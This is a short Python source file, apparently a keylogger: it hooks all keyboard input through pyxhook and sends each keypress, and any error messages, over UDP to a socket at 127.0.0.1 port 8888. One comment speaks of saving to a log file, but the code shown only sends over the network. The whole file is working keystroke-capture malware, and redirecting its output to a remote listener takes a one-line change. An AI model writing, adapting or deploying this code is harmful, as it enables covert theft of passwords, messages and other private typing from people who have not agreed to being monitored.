import os
import pyxhook
from multiprocessing import Process
import socket

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

#creating key pressing event and saving it into log file
def OnKeyPress(event):
    client.sendto('{}\n'.format(event.Key).encode('utf-8'), ("127.0.0.1", 8888))
  
# create a hook manager object
new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress
# set the hook
new_hook.HookKeyboard()
try:
    new_hook.start()
except KeyboardInterrupt:
    # User cancelled from command line.
    pass
except Exception as ex:
    # Write exceptions to the log file, for analysis later.
    msg = 'Error while catching events:\n  {}'.format(ex)
    pyxhook.print_err(msg)
    client.sendto('{}\n'.format(msg).encode('utf-8'), ("127.0.0.1", 8888))
